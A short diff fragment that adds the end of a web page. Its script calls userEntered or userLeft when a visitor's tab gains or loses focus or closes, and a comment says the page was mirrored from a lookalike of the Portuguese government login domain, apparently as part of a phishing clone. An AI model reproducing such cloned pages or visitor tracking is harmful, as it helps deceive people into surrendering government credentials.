+        if (document.visibilityState === 'visible') {
+            userEntered();
+        } else {
+            userLeft();
+        }
+    }
+
+    document.addEventListener('visibilitychange', onVisibilityChange);
+    
+    $(window).on('beforeunload', function() {
+            userLeft();
+        });
+</script>
+
+
+</div></div></body><!-- Mirrored from autenticacao-gov.pt-verif.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 28 Feb 2024 19:17:39 GMT --></html>
